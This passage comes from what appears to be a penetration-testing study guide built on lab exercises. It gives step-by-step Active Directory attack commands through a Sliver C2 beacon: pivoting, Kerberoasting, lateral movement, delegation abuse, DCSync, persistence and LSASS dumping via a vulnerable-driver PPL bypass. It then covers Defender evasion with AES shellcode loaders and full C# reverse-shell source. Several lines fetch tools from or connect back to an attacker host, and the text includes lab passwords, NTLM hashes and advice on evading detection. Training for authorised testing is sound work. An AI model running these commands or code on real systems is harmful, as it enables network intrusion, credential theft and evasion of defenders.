sliver (http-beacon) > execute -o powershell $Forest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest(); $Forest.Domains
  • Enumerate users and descriptions via sharpsh + PowerView: 
    echo -n "get-netuser | select samaccountname,description" | base64
sliver (http-beacon) > sharpsh -- '-u http://<ATTACKER>:8081/PowerView.ps1 -e -c <B64>'
  • Enumerate SPNs (kerberoastable accounts): 
    echo "Get-NetUser -spn | select samaccountname,description" | base64
sliver (http-beacon) > sharpsh -- '-u http://<ATTACKER>:8080/PowerView.ps1 -e -c "<B64>"'
sliver (http-beacon) > delegationbof 6 child.[domain]
  • Enumerate pre-auth not required (ASREPRoast candidates): 
    sliver (http-beacon) > execute-assembly /home/htb-ac590/SharpView.exe "get-netuser -PreauthNotRequired" -t 240 -i -E -M
  • Get domain and DC info: 
    sliver (http-beacon) > c2tc-domaininfo
sliver (http-beacon) > execute-assembly /home/htb-ac590/SharpView.exe "get-domain" -t 240 -i -E -M
  • Enumerate ADCS certificate templates: 
    sliver (http-beacon) > certify -- find
  • Check network adapters for pivot opportunities: 
    sliver (http-beacon) > ifconfig

12.11 Pivoting

WEB01 is the DMZ entry point with two network adapters; internal machines ([host], SRV02, [dc]) are on [target-ip]/24 and unreachable directly. Pivot through WEB01.

Note: At time of writing, only session mode supports Sliver's built-in pivot commands. When using SOCKS5 with external tools, run the implant inside a process that normally makes DNS/LDAP queries to avoid anomalous traffic alerts.

12.11.1 SOCKS5 Proxy

# Start SOCKS5 proxy on port 1080 via the WEB01 session
sliver (http-beacon) > socks5 start -P 1080

# Verify listener on attacker machine
netstat -ano | grep 1080

# Tunnel tools through the proxy
proxychains crackmapexec smb [target-ip] -u [user] -p '[password]'

12.11.2 Chisel (SOCKS5 via Reverse Tunnel)

# Install dependencies
sudo apt install mingw-w64

# Clone forked chisel with Sliver extension support
git clone https://github.com/MrAle98/chisel
cd chisel/
mkdir ~/.sliver-client/extensions/chisel
cp extension.json ~/.sliver-client/extensions/chisel
make windowsdll_64
make windowsdll_32
# Configure proxychains for SOCKS5
sudo sh -c 'sed -i s/socks4/socks5/g /etc/proxychains.conf && sed -i s/9050/1080/g /etc/proxychains.conf'

# Start chisel server on attacker machine
chisel server --reverse -p 1337 -v --socks5

# Connect from Sliver session on WEB01
sliver (http-beacon) > chisel client [target-ip]:1337 R:socks

# Verify access to internal machines
proxychains crackmapexec smb [target-ip] -u [user] -p '[password]'

12.11.3 SSH Reverse Dynamic Port Forwarding

# Configure SSH to listen on port 2222 (if VPN uses port 22)
sudo sh -c 'echo "Port 2222" >> /etc/ssh/sshd_config'
sudo systemctl restart sshd.service
ss -ntlp

# From WEB01 via RDP session: SSH reverse dynamic forward
PS C:\Users\eric> ssh -R 1080 [username]@[attacker-ip] -p 2222
# Verify pivot works
proxychains crackmapexec smb [target-ip] -u '[user]' -p '[password]'

12.11.4 Reverse Port Forwarding (rportfwd)

# Forward port 8080 on WEB01 back to attacker port 8080
sliver (http-beacon) > rportfwd add -b 8080 -r 127.0.0.1:8080

This allows [host] to reach the attacker's HTTP server on port 8080 via WEB01's internal IP.

12.11.5 TCP Pivot Listener

# Start TCP pivot listener on WEB01's internal IP
sliver (http-beacon) > pivots tcp --bind [target-ip]

# Generate service-format implant pointing to the pivot
sliver (http-beacon) > generate --format service -i [target-ip]:9898 --skip-symbols -N psexec-pivot

# List active pivot listeners
sliver (http-beacon) > pivots
  • Start SOCKS5 proxy on WEB01 session: 
    sliver (http-beacon) > socks5 start -P 1080
netstat -ano | grep 1080
  • Alternatively, use chisel reverse SOCKS5: 
    chisel server --reverse -p 1337 -v --socks5
sliver (http-beacon) > chisel client [target-ip]:1337 R:socks
  • Or SSH reverse dynamic port forward from WEB01: 
    sudo sh -c 'echo "Port 2222" >> /etc/ssh/sshd_config'
sudo systemctl restart sshd.service
# On WEB01 via RDP:
ssh -R 1080 [attacker-user]@[attacker-ip] -p 2222
  • Set up TCP pivot for internal lateral movement: 
    sliver (http-beacon) > pivots tcp --bind [target-ip]
sliver (http-beacon) > generate --format service -i [target-ip]:9898 --skip-symbols -N psexec-pivot
  • Verify access to internal targets via proxy: 
    proxychains crackmapexec smb [target-ip] -u [user] -p '[password]'
proxychains crackmapexec smb [target-ip] -u [user] -p '[password]'

12.12 Kerberoasting

# Enumerate SPN accounts via sharpsh + PowerView
echo "Get-NetUser -spn | select samaccountname,description" | base64
sliver (http-beacon) > sharpsh -- '-u http://[target-ip]:8080/PowerView.ps1 -e -c "R2V0LU5ldFVzZXIg..."'

# Enumerate via delegationbof (number 6 = SPN LDAP check)
sliver (http-beacon) > delegationbof 6 child.[domain]

# Native SPN enumeration
sliver (http-beacon) > shell
PS C:\Users\eric\Desktop> setspn.exe -Q */*
# Kerberoast a specific user via inline-execute-assembly + Rubeus
sliver (http-beacon) > inline-execute-assembly /home/htb-ac590/Rubeus.exe 'kerberoast /format:hashcat /user:alice /nowrap'

# Kerberoast via c2tc-kerberoast BOF
sliver (http-beacon) > c2tc-kerberoast roast alice

# Kerberoast via bof-roast (by SPN value)
sliver (http-beacon) > bof-roast rdp/web01.child.[domain]
# Convert c2tc-kerberoast ticket to hashcat format
python3 TicketToHashcat.py <saved-ticket-file>

# Convert bof-roast output to hashcat format
python3 apreq2hashcat.py <ticket>
# Crack the hash
hashcat -m 13100 roastme-13100.txt /usr/share/wordlists/rockyou.txt
john roastme-13100.txt -w=/usr/share/wordlists/rockyou.txt
  • Enumerate SPN accounts (kerberoast candidates): 
    sliver (http-beacon) > delegationbof 6 child.[domain]
  • Kerberoast a target user: 
    sliver (http-beacon) > inline-execute-assembly /home/htb-ac590/Rubeus.exe 'kerberoast /format:hashcat /user:alice /nowrap'
  • Convert ticket to hashcat format and crack: 
    python3 TicketToHashcat.py <ticket-file>
hashcat -m 13100 roastme-13100.txt /usr/share/wordlists/rockyou.txt

12.13 ASREPRoasting

# Enumerate pre-auth not required accounts (via RSAT on target)
PS C:\Users\eric\Desktop> Install-WindowsFeature -Name RSAT-AD-PowerShell
Get-ADUser -Filter { DoesNotRequirePreAuth -eq $true } -Properties DoesNotRequirePreAuth | select SamAccountName, DoesNotRequirePreAuth
# ASREPRoast via Rubeus
sliver (http-beacon) > inline-execute-assembly /home/htb-ac590/Rubeus.exe 'asreproast /format:hashcat /user:bob /nowrap'

# Crack the hash
hashcat -m 18200 asrep-hashes.txt /usr/share/wordlists/rockyou.txt
  • Enumerate accounts with pre-auth disabled: 
    sliver (http-beacon) > execute-assembly /home/htb-ac590/SharpView.exe "get-netuser -PreauthNotRequired" -t 240 -i -E -M
# or via Get-ADUser if RSAT available:
Get-ADUser -Filter { DoesNotRequirePreAuth -eq $true } -Properties DoesNotRequirePreAuth | select SamAccountName
  • ASREPRoast target user: 
    sliver (http-beacon) > inline-execute-assembly /home/htb-ac590/Rubeus.exe 'asreproast /format:hashcat /user:bob /nowrap'
  • Crack ASREPRoast hash: 
    hashcat -m 18200 asrep-hashes.txt /usr/share/wordlists/rockyou.txt

12.14 Impersonation and Token Manipulation

12.14.1 make-token

make-token creates a new logon session with provided credentials and impersonates the resulting token. Defaults to LOGON_NEW_CREDENTIALS: clone current token with new credentials for outbound connections only.

Logon TypeDescription
LOGON_INTERACTIVEConsole, RDP session logon
LOGON_NETWORKHigh-performance server authenticators (password, NT hash, Kerberos ticket)
LOGON_BATCHScheduled tasks, startup processes
LOGON_SERVICERequires service privileges
LOGON_UNLOCKUses DLLs loaded by Winlogon
LOGON_NETWORK_CLEARTEXTPlaintext credentials sent to the DC
LOGON_NEW_CREDENTIALSClone token, new credentials for outbound (default in make-token)
 
# Impersonate svc_sql for network authentication
sliver (http-beacon) > make-token -u [user] -d child.[domain] -p [password]

# Verify access to remote machine C$
sliver (http-beacon) > ls //srv01.child.[domain]/c$

# Revert to original token
sliver (http-beacon) > rev2self

12.15 Lateral Movement

12.15.1 PsExec (Sliver Built-in)

Sliver's psexec uploads a service binary to the target and creates/runs a Windows service via the ADMIN$ share. Requires port 445 open and local admin on the target. Must use a service-format implant and an active pivot listener.

# 1. Create token for svc_sql
sliver (http-beacon) > make-token -u [user] -d child.[domain] -p [password]

# 2. Generate service-format implant pointing to TCP pivot
sliver (http-beacon) > generate --format service -i [target-ip]:9898 --skip-symbols -N psexec-pivot

# 3. PsExec to [host] using the current token
sliver (http-beacon) > psexec --custom-exe /home/htb-ac590/psexec-pivot.exe --service-name Teams --service-description MicrosoftTeaams srv01.child.[domain]

# 4. Verify sessions
sliver (http-beacon) > sessions
Note: Sliver PsExec places the service binary in C:\Windows\Temp by default - a monitored location. The service name and description should be convincing; defaults expose "Sliver" strings.

12.15.2 WMIC

# Generate TCP-pivot implant
sliver (http-beacon) > generate -i [target-ip]:9898 --skip-symbols -N wmicpivot

# Impersonate svc_sql, upload to SRV02, then execute
sliver (http-beacon) > make-token -u [user] -d child.[domain] -p [password]
sliver (http-beacon) > cd //srv02.child.[domain]/c$/windows/tasks
sliver (http-beacon) > upload wmicpivot.exe
sliver (http-beacon) > rev2self

# Execute via WMIC
wmic /node:[target-ip] /user:[user] /password:jkhnrjk123! process call create "C:\\windows\tasks\\wmicpivot.exe"

# Or via Sliver execute
sliver (http-beacon) > execute -o wmic /node:[target-ip] /user:[user] /password:jkhnrjk123! process call create "C:\\windows\\tasks\\wmicpivot.exe"

12.15.3 wmiexec (Impacket)

# Remote shell via WMI
proxychains impacket-wmiexec child/svc_sql:jkhnrjk123\!@[target-ip]

# Use C$ share to avoid writing to ADMIN$ (detection avoidance)
proxychains impacket-wmiexec child/svc_sql:jkhnrjk123\!@[target-ip] -share C$

12.15.4 DCOM (dcomexec)

# Remote shell via DCOM MMC20 object
proxychains impacket-dcomexec -object MMC20 child/svc_sql:jkhnrjk123\!@[target-ip]

Other supported DCOM objects: ShellWindows, ShellBrowserWindow. DCOM is harder to detect than PsExec due to diverse IOCs.

12.15.5 PsExec (Impacket through proxy)

proxychains impacket-psexec child/svc_sql:jkhnrjk123\!@[target-ip]
  • Impersonate target user and verify access: 
    sliver (http-beacon) > make-token -u [user] -d child.[domain] -p [password]
sliver (http-beacon) > ls //srv01.child.[domain]/c$
  • Lateral move via Sliver psexec (with TCP pivot): 
    sliver (http-beacon) > pivots tcp --bind [target-ip]
sliver (http-beacon) > generate --format service -i [target-ip]:9898 --skip-symbols -N psexec-pivot
sliver (http-beacon) > psexec --custom-exe /home/htb-ac590/psexec-pivot.exe --service-name Teams --service-description MicrosoftTeaams srv01.child.[domain]
  • Lateral move via WMIC: 
    sliver (http-beacon) > make-token -u [user] -d child.[domain] -p [password]
sliver (http-beacon) > upload wmicpivot.exe
sliver (http-beacon) > execute -o wmic /node:[target-ip] /user:[user] /password:jkhnrjk123! process call create "C:\\windows\\tasks\\wmicpivot.exe"
  • Lateral move via Impacket tools through proxy: 
    proxychains impacket-psexec child/svc_sql:jkhnrjk123\!@[target-ip]
proxychains impacket-wmiexec child/svc_sql:jkhnrjk123\!@[target-ip]
proxychains impacket-dcomexec -object MMC20 child/svc_sql:jkhnrjk123\!@[target-ip]

12.16 Kerberos Delegation Exploitation

12.16.1 Unconstrained Delegation

When a computer has unconstrained delegation, the KDC embeds the user's TGT inside the TGS ticket sent to that service. The service caches these TGTs in memory. Compromising the server allows extracting and using all cached TGTs to impersonate any user who authenticated.

# Enumerate unconstrained delegation computers via sharpsh
echo "Get-NetComputer -Unconstrained" | base64
# Result: R2V0LU5ldENvbXB1dGVyIC1VbmNvbnN0cmFpbmVkCg==

sliver (psexec-pivot) > sharpsh -- '-u http://[target-ip]:8080/PowerView.ps1 -e -c R2V0LU5ldENvbXB1dGVyIC1VbmNvbnN0cmFpbmVkCg=='
# Set up rportfwd so [host] can reach attacker's HTTP server
sliver (psexec-pivot) > rportfwd add -b 8080 -r 127.0.0.1:8080
# Monitor for cached TGTs on [host] (requires local admin beacon on [host])
# On [host] via PsExec shell:
.\Rubeus.exe monitor /interval:5 /nowrap

# Coerce [dc] to authenticate to [host] via Print Spooler (MS-RPRN)
sliver (psexec-pivot) > inline-execute-assembly /home/htb-ac590/SpoolSample.exe '[dc] srv01'
# Save captured TGT to disk (base64 decode ticket from Rubeus output)
[System.IO.File]::WriteAllBytes("C:\windows\temp\[dc].kirbi", [System.Convert]::FromBase64String("<B64-TICKET>"))

# Import ticket and DCSync
.\mimikatz.exe "privilege::debug" "kerberos::ptt C:\windows\temp\[dc].kirbi" "lsadump::dcsync /domain:child.[domain] /user:child\administrator" "exit"

12.16.2 Constrained Delegation

Constrained delegation allows a service to request TGS tickets on behalf of users but only to specified services (msDS-AllowedToDelegateTo). Uses S4U2Self and S4U2Proxy extensions. The service name in the TGS is not protected, allowing alternate service name abuse.

# Enumerate computers with constrained delegation (TrustedToAuth)
sliver (http-beacon) > sharpview Get-NetComputer -TrustedToAuth
# Dump LSASS on WEB01 (SYSTEM session) to get machine account NTLM hash
sliver (http-beacon) > nanodump 656 web01-lsass 1 PMDM
sliver (http-beacon) > download web01-lsass
python3 -m pypykatz lsa minidump web01-lsass
# Request TGT for WEB01$ machine account using its RC4/NT hash
sliver (http-beacon) > inline-execute-assembly /home/htb-ac-1008/Rubeus.exe 'asktgt /user:web01$ /rc4:021b6a0d0e0ca246ec266bb72a481bc6 /nowrap'

# S4U2Self + S4U2Proxy: impersonate 'carrot' to access eventsystem service on SRV02
sliver (http-beacon) > inline-execute-assembly /home/htb-ac-1008/Rubeus.exe 's4u /impersonateuser:carrot /msdsspn:eventsystem/srv02.child.[domain] /user:web01$ /ticket:<BASE64-TGT> /nowrap'

# Verify access
sliver (http-beacon) > ls //srv02.child.[domain]/c$
  • Enumerate unconstrained delegation targets: 
    echo "Get-NetComputer -Unconstrained" | base64
sliver (psexec-pivot) > sharpsh -- '-u http://[target-ip]:8080/PowerView.ps1 -e -c <B64>'
  • Monitor for TGTs and coerce DC with SpoolSample: 
    .\Rubeus.exe monitor /interval:5 /nowrap
sliver (psexec-pivot) > inline-execute-assembly /home/htb-ac590/SpoolSample.exe '[dc] srv01'
  • Import captured DC TGT and DCSync: 
    .\mimikatz.exe "privilege::debug" "kerberos::ptt C:\windows\temp\[dc].kirbi" "lsadump::dcsync /domain:child.[domain] /user:child\administrator" "exit"
  • Enumerate constrained delegation computers: 
    sliver (http-beacon) > sharpview Get-NetComputer -TrustedToAuth
  • Exploit constrained delegation (S4U attack): 
    sliver (http-beacon) > nanodump <lsass-pid> web01-lsass 1 PMDM
sliver (http-beacon) > download web01-lsass
python3 -m pypykatz lsa minidump web01-lsass
sliver (http-beacon) > inline-execute-assembly /home/htb-ac-1008/Rubeus.exe 'asktgt /user:web01$ /rc4:<HASH> /nowrap'
sliver (http-beacon) > inline-execute-assembly /home/htb-ac-1008/Rubeus.exe 's4u /impersonateuser:carrot /msdsspn:cifs/srv01.child.[domain] /user:web01$ /ticket:<B64-TGT> /nowrap'

12.17 DACL Exploitation and Domain Compromise

12.17.1 BloodHound Collection (sharp-hound-4)

# Run sharp-hound-4 with custom zip name (avoid default BloodHound.zip detection)
sliver (psexec-pivot) > sharp-hound-4 -- -c All --zipfilename academy

# Download the resulting zip
sliver (psexec-pivot) > download 20231110100403_academy.zip
Note: Sigma rules detect files ending in BloodHound.zip, _users.json, _computers.json, etc. Always rename the output with --zipfilename. If BloodHound CE reports version incompatibility, use bloodhound-convert on the zip.

12.17.2 ForceChangePassword

# Change david's password via bloodyAD (svc_sql has ForceChangePassword over david)
proxychains bloodyAD --host [target-ip] -d child.[domain] -u [user] -p '[password]' set password david '[password]'

# Verify
proxychains crackmapexec smb [target-ip] -u david -p '[password]'

12.17.3 GenericWrite (Targeted Kerberoasting)

# david has GenericWrite over websec; set a fake SPN to make websec kerberoastable
proxychains bloodyAD --host [target-ip] -d child.[domain] -u david -p '[password]' set object websec servicePrincipalName -v fake/web01.child.[domain]

# Confirm SPN was set
proxychains bloodyAD --host [target-ip] -d child.[domain] -u david -p '[password]' get object websec

# Kerberoast the newly SPN-assigned user
sliver (http-beacon) > c2tc-kerberoast roast websec

# Convert ticket and crack
python3 TicketToHashcat.py websec-ticket.enc
john roastme-13100.txt -w=/usr/share/wordlists/rockyou.txt

12.17.4 DCSync

# Check password reuse across accounts
proxychains -q crackmapexec ldap [target-ip] -u websec mobilesec -p [password] --continue-on-success

# DCSync via mobilesec (has DCSync permission per BloodHound)
proxychains impacket-secretsdump -just-dc mobilesec:spongebob@[target-ip] | grep -i child.[domain]

12.17.5 Domain Controller Compromise - Method 1: Rubeus PTT + PsExec

# Request TGT for Administrator using dumped NTLM hash (inject into memory with /ptt)
sliver (http) > rubeus -- asktgt /user:Administrator /d:child.[domain] /rc4:e7d6a507876e2c8b7534143c1c6f28ba /ptt

# Verify DC access
sliver (http) > ls //[dc].child.[domain]/c$

# Set up pivot and PsExec to [dc]
sliver (http) > pivots tcp
sliver (http) > generate --format service -i [target-ip]:9898 --skip-symbols -N psexec-pivot
sliver (http) > psexec --custom-exe psexec-pivot.exe --service-name Teams --service-description MicrosoftTeaams [dc].child.[domain]

# Grant DCSync rights to svc_sql via SharpView on [dc]
sliver (psexec-pivot) > sharpview -- 'Add-DomainObjectAcl -PrincipalIdentity svc_sql -Rights DCSync'

# Verify with secretsdump
proxychains impacket-secretsdump -just-dc 'svc_sql:jkhnrjk123!'@[target-ip] | grep -i :::

12.17.6 Domain Controller Compromise - Method 2: Evil-WinRM + PowerView

# Connect to [dc] with Administrator hash, load PowerView via Evil-WinRM
proxychains evil-winrm -i [target-ip] -u Administrator -H e7d6a507876e2c8b7534143c1c6f28ba -s .
*Evil-WinRM* PS C:\Users\Administrator\Documents> PowerView.ps1
*Evil-WinRM* PS C:\Users\Administrator\Documents> menu

# Grant DCSync rights to svc_sql
*Evil-WinRM* PS C:\Users\Administrator\Documents> Add-DomainObjectAcl -PrincipalIdentity svc_sql -Rights DCSync

# Verify
proxychains impacket-secretsdump -just-dc 'svc_sql:jkhnrjk123!'@[target-ip] | grep -i :::

12.17.7 AdminSDHolder Persistence

AdminSDHolder is a special container that protects built-in privileged groups. SDProp (Security Descriptor Propagator) runs every ~60 minutes and resets ACLs of protected objects to match AdminSDHolder. Adding an ACE to AdminSDHolder itself causes that permission to propagate to all Domain Admins, Enterprise Admins, etc. on the next SDProp run.

# Grant Eric Full Control via AdminSDHolder (propagates to all protected objects)
*Evil-WinRM* PS C:\Users\Administrator\Documents> Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=child,DC=[domain],DC=[tld]" -PrincipalIdentity eric -Rights All

12.17.8 Skeleton Key

Mimikatz's misc::skeleton patches LSASS to accept a master password (mimikatz) for any account. Not persistent across reboots. Detected by most EDR via LSASS memory integrity checks.

# Backdoor LSASS with skeleton key
*Evil-WinRM* PS C:\Users\Administrator\Documents> upload mimikatz.exe
.\mimikatz.exe "privilege::debug" "misc::skeleton" "exit"

12.17.9 PPL Bypass (Protected Process Light)

Some hosts have PPL (Protected Process Light) enabled for lsass.exe, blocking even SYSTEM from opening the process for dump. PPL can be bypassed using a vulnerable signed driver to remove the protection flag from the target process.

# Load RTCore64.sys vulnerable driver
*Evil-WinRM* PS C:\Users\svc_sql\Documents> sc.exe create RTCore64 type= kernel start= auto binPath= C:\Users\svc_sql\Documents\RTCore64.sys DisplayName= "control"
*Evil-WinRM* PS C:\Users\svc_sql\Documents> net start RTCore64

# List PPL-protected processes
*Evil-WinRM* PS C:\Users\svc_sql\Documents> .\PPLcontrol.exe list

# Unprotect lsass (find PID from ps output)
*Evil-WinRM* PS C:\Users\svc_sql\Documents> .\PPLcontrol.exe unprotect 656

# Now dump credentials from unprotected lsass
*Evil-WinRM* PS C:\Users\svc_sql\Documents> .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
Note: PPL bypass tools (PPLcontrol, EDRSandblast, RToolZ) leverage signed vulnerable drivers (RTCore64.sys, ProcExp152.sys). The mimidrv.sys mimikatz driver is flagged by most AV/EDR. Build or use a different signed vulnerable driver when operating against defended environments.
  • Collect BloodHound data and identify DACL attack paths: 
    sliver (psexec-pivot) > sharp-hound-4 -- -c All --zipfilename academy
sliver (psexec-pivot) > download 20231110100403_academy.zip
  • Exploit ForceChangePassword to take over target user: 
    proxychains bloodyAD --host [target-ip] -d child.[domain] -u [user] -p '[password]' set password david '[password]'
  • Exploit GenericWrite via targeted Kerberoasting: 
    proxychains bloodyAD --host [target-ip] -d child.[domain] -u david -p '[password]' set object websec servicePrincipalName -v fake/web01.child.[domain]
sliver (http-beacon) > c2tc-kerberoast roast websec
python3 TicketToHashcat.py websec-ticket.enc
john roastme-13100.txt -w=/usr/share/wordlists/rockyou.txt
  • DCSync to dump all hashes once DCSync permission is obtained: 
    proxychains impacket-secretsdump -just-dc mobilesec:spongebob@[target-ip] | grep -i child.[domain]
  • Pivot to [dc] via Rubeus PTT + Sliver PsExec: 
    sliver (http) > rubeus -- asktgt /user:Administrator /d:child.[domain] /rc4:<HASH> /ptt
sliver (http) > ls //[dc].child.[domain]/c$
sliver (http) > psexec --custom-exe psexec-pivot.exe --service-name Teams --service-description MicrosoftTeaams [dc].child.[domain]
  • Grant DCSync rights and verify full domain credential dump: 
    sliver (psexec-pivot) > sharpview -- 'Add-DomainObjectAcl -PrincipalIdentity svc_sql -Rights DCSync'
proxychains impacket-secretsdump -just-dc 'svc_sql:jkhnrjk123!'@[target-ip] | grep -i :::
  • If PPL blocks LSASS dump, bypass with vulnerable driver: 
    sc.exe create RTCore64 type= kernel start= auto binPath= C:\...\RTCore64.sys DisplayName= "control"
net start RTCore64
.\PPLcontrol.exe list
.\PPLcontrol.exe unprotect <lsass-pid>
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
  • Establish AdminSDHolder persistence: 
    Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=child,DC=[domain],DC=[tld]" -PrincipalIdentity <user> -Rights All

13. Windows Evasion Techniques

Windows evasion work includes Microsoft Defender Antivirus bypasses, static and dynamic evasion, AMSI bypasses, UAC bypasses, AppLocker evasion via default ruleset abuse and LOLBINs, and PowerShell ConstrainedLanguage Mode bypasses. The lab uses two VMs: EVASION-DEV (admin access, for payload development) and EVASION-TARGET (low-priv user alpha).

# Map a local drive to the remote machine for file transfers
xfreerdp /v:[IP] /u:[USERNAME] /p:'[PASSWORD]' /dynamic-resolution /drive:linux,/tmp
VMUsernamePasswordRole
EVASION-DEVAdministratorEva$i0n!Built-in administrator
EVASION-DEVmariaEva$i0n!Administrator
EVASION-DEVmaxEva$i0n!Standard user
EVASION-TARGETalphaFGQxrLW2Standard user
Note: C:\Tools has an AV exclusion on EVASION-DEV. Place files in C:\Alpha\<subfolder> on EVASION-TARGET; each subfolder generates a log.txt.

13.1 Microsoft Defender Antivirus

Microsoft Defender Antivirus ships pre-installed on every Windows copy since Windows 8 and uses two main detection categories.

CategoryScopeTrigger Examples
Static AnalysisOn-disk detection before executionFile creation/modification; hash/byte/string signature match
Dynamic AnalysisIn-memory detection of running processesSuspicious behavior (e.g., Word spawning PowerShell); new process creation

13.1.1 Interacting with Defender via PowerShell

# List all Defender module commands
Get-Command -Module Defender

# Check AV status (signatures, tamper protection, real-time protection)
Get-MpComputerStatus

# View threat detection history
Get-MpThreat

# View detection details for a specific ThreatID
Get-MpThreatDetection -ThreatID 2147894794

# Disable real-time protection (requires admin, for dev use only)
Set-MpPreference -DisableRealTimeMonitoring $true

# Clear protection history
# Delete all files in: C:\ProgramData\Microsoft\Windows Defender\Scans\History\Service
Note: Get-MpThreat output shows ThreatName, ThreatID, and whether the threat executed. Use Get-MpThreatDetection -ThreatID <id> to find the exact file path and detection time.

13.2 Static Analysis Bypass

Static analysis detects malware on disk via signature scans checking file hashes, byte patterns, and strings against a known-malicious database. The Defender signature DB is not public but can be explored with ExpandDefenderSig.ps1.

# Decompress and extract Defender signature database
Import-Module C:\Tools\ExpandDefenderSig\ExpandDefenderSig.ps1
ls "C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{50326593-AC5A-4EB5-A3F0-047A75D1470C}\mpavbase.vdm" | Expand-DefenderAVSignatureDB -OutputFileName mpavbase.raw

# Search for a known string in the raw signature DB
C:\Tools\Strings\strings64.exe .\mpavbase.raw | Select-String -Pattern "WNcry@2ol7"

13.2.1 Locating Detected Bytes with ThreatCheck

ThreatCheck splits a file into chunks and scans them individually to pinpoint which bytes trigger detection.

# Identify flagged bytes in a binary (disable real-time protection first)
C:\Tools\ThreatCheck-master\ThreatCheck\ThreatCheck\bin\x64\Release\ThreatCheck.exe -f .\NotMalware.exe

13.2.2 XOR Encryption (Insufficient)

XOR-encrypting shellcode before storing it in the binary prevents signature matching on-disk. The decryption loop runs in memory immediately before writing to the allocated buffer.

// XOR'd shellcode stored in binary
byte[] buf = new byte[] { /* XOR'd bytes */ };

// Decrypt shellcode in-place with key 0x5C
int i = 0;
while (i < buf.Length)
{
    buf[i] = (byte)(buf[i] ^ 0x5c);
    i++;
}
// ... then VirtualAlloc / Marshal.Copy / VirtualProtect / CreateThread
Note: Simple XOR encryption is no longer sufficient against Defender. The decrypted shellcode in memory still matches signatures during dynamic scanning.

13.2.3 AES Encryption (Effective for Static)

AES-encrypting the shellcode produces ciphertext that does not match any known signature. CyberChef can generate the encrypted payload. The C# loader decrypts at runtime before writing to memory.

using System.Security.Cryptography;

// AES-encrypted shellcode as Base64 string
string bufEnc = "<SNIP>";

// Decrypt shellcode
Aes aes = Aes.Create();
byte[] key = new byte[16] { 0x1f, 0x76, 0x8b, 0xd5, 0x7c, 0xbf, 0x02, 0x1b,
                              0x25, 0x1d, 0xeb, 0x07, 0x91, 0xd8, 0xc1, 0x97 };
byte[] iv  = new byte[16] { 0xee, 0x7d, 0x63, 0x93, 0x6a, 0xc1, 0xf2, 0x86,
                              0xd8, 0xe4, 0xc5, 0xca, 0x82, 0xdf, 0xa5, 0xe2 };
ICryptoTransform decryptor = aes.CreateDecryptor(key, iv);
byte[] buf;
using (var msDecrypt = new System.IO.MemoryStream(Convert.FromBase64String(bufEnc)))
{
    using (var csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
    {
        using (var msPlain = new System.IO.MemoryStream())
        {
            csDecrypt.CopyTo(msPlain);
            buf = msPlain.ToArray();
        }
    }
}
// ... then VirtualAlloc / Marshal.Copy / VirtualProtect / CreateThread
Note: AES encryption defeats static analysis. Dynamic analysis (behavioral scanning) is triggered separately when the shellcode executes - for example, when a child process is spawned.

Methodology

  • Disable real-time protection temporarily to compile and test: 
    Set-MpPreference -DisableRealTimeMonitoring $true
  • Run ThreatCheck to identify flagged bytes: 
    C:\Tools\ThreatCheck-master\ThreatCheck\ThreatCheck\bin\x64\Release\ThreatCheck.exe -f .\payload.exe
  • AES-encrypt shellcode via CyberChef, embed encrypted blob in loader, add decryption routine, recompile (x64, Release).
  • Re-enable real-time protection and verify the file is not deleted when copied out of C:\Tools: 
    Set-MpPreference -DisableRealTimeMonitoring $false
Copy-Item .\payload.exe C:\Users\Public\

13.3 Dynamic Analysis Bypass

Dynamic analysis triggers when a process performs suspicious operations (e.g., spawning a child process), causing Defender to scan process memory. If decrypted shellcode resides unencrypted in memory at scan time, the process is killed.

OptionApproachTrade-off
Option 1Modify the payload's source code to avoid triggering memory scansRequires assembly/RE knowledge; out of scope
Option 2Replace well-known payload (Meterpreter) with a less-known oneQuick; effective until signatures are added
Option 3Write fully custom tools with no known-malicious componentsMost durable; most time-consuming

13.3.1 Option 2: micr0_shell Payload

micr0_shell generates PIC null-free reverse shell shellcode for Windows x64. Because it is not a well-known tool, Defender has no signature for its shellcode - even if a memory scan is triggered, nothing is detected.

# Generate C# shellcode for reverse shell
python.exe .\micr0_shell.py -i <LHOST> -p 8080 -l csharp

Copy the output shellcode into the AES-encryption CyberChef recipe used previously, embed the resulting Base64 string into the loader, recompile.

13.3.2 Option 3: Custom TCP Reverse Shell (RShell)

A custom reverse shell written from scratch uses no known-malicious components. Even if Defender scans memory after a child process is spawned, no signatures match.

using System;
using System.IO;
using System.Net.Sockets;
using System.Diagnostics;

namespace RShell
{
    internal class Program
    {
        private static StreamWriter streamWriter;

        static void Main(string[] args)
        {
            if (args.Length != 2)
            {
                Console.WriteLine("Usage: RShell.exe <IP> <Port>");
                return;
            }
            try
            {
                // Connect to <IP> on <Port>/TCP
                TcpClient client = new TcpClient();
                client.Connect(args[0], int.Parse(args[1]));

                Stream stream = client.GetStream();
                StreamReader streamReader = new StreamReader(stream);
                streamWriter = new StreamWriter(stream);

                // Spawn hidden PowerShell process with STDOUT/ERR/IN redirected
                Process p = new Process();
                p.StartInfo.FileName = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
                p.StartInfo.Arguments = "-ep bypass -nologo";
                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.RedirectStandardError = true;
                p.StartInfo.RedirectStandardInput = true;
                p.OutputDataReceived += new DataReceivedEventHandler(HandleDataReceived);
                p.ErrorDataReceived += new DataReceivedEventHandler(HandleDataReceived);

                p.Start();
                p.BeginOutputReadLine();
                p.BeginErrorReadLine();

                string userInput = "";
                while (!userInput.Equals("exit"))
                {
                    userInput = streamReader.ReadLine();
                    p.StandardInput.WriteLine(userInput);
                }

                p.WaitForExit();
                client.Close();
            }
            catch (Exception) { }
        }

        private static void HandleDataReceived(object sender, DataReceivedEventArgs e)
        {
            if (e.Data != null)
            {
                streamWriter.WriteLine(e.Data);
                streamWriter.Flush();
            }
        }
    }
}

Methodology

  • Generate shellcode with micr0_shell: 
    python.exe .\micr0_shell.py -i <LHOST> -p <LPORT> -l csharp
